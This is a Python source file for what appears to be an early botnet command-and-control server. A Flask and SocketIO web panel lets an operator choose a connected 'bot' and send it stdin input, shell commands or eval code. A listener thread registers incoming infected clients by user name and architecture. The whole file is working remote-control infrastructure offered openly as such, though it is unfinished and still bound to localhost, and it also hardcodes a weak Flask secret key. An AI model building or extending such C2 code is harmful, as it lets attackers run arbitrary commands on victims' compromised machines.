import socket
import time
import json
from threading import Thread
from flask import Flask, render_template, session, request
from flask_socketio import SocketIO, emit

# Loading library depends on how we want to setup the project later,
# for now this will do
try: from server import byteutils
except: import byteutils


''' Sumner: if you are reading this I have only just got the main concept working,
Looks pretty dope though so far.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
allConnections = {}
connected = 'EvanKing' #temp variable for testing

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None


@app.route('/', methods=['GET', 'POST'])
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)


@socketio.on('send_command', namespace='/bot')
def send_receive(cmd):
    output = allConnections[connected].send(cmd['data'])
    output = json.loads(output)['output']
    if output:
        emit('response',
             {'data': output[:-1]})


#TODO: not done
@app.route("/", methods=['GET', 'POST'])
def bot_selector():
    select = request.form.get('bot')
    connected = str(select)
    print(connected)

class BotNet(Thread):
    def __init__(self, tcpsock):
        Thread.__init__(self)
        self.tcpsock = tcpsock

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            msgbytes = byteutils.recvFormatBytes(clientsock)
            host_info = json.loads(msgbytes.decode('UTF-8'))
            print("[+] Recieved connection from {}".format(host_info['user']))
            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)

            # Testing: automatically sends "say hi" command
            allConnections[host_info['user'][:-1]].sendStdin('say hi\n')


# TODO: can make this multi-threaded if want to send to multiple clients at once
class Bot:
    def __init__(self, sock, host_info):
        self.sock = sock
        self.arch = host_info['arch']
        self.user = host_info['user']

    def sendStdin(self, cmd):
        json_str = json.dumps(dict(stdin=cmd))
        json_format = byteutils.formatBytes(json_str)
        self.sock.sendall(json_format)

    def sendCmd(self, cmd):
        json_str = json.dumps(dict(cmd=cmd))
        json_format = byteutils.formatBytes(json_str)
        self.sock.sendall(json_format)

    def sendEval(self, cmd):
        json_str = json.dumps(dict(eval=cmd))
        json_format = byteutils.formatBytes(json_str)
        self.sock.sendall(json_format)

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))
    BotNet(TCPSOCK).start()

    socketio.run(app, debug=True, use_reloader=False)
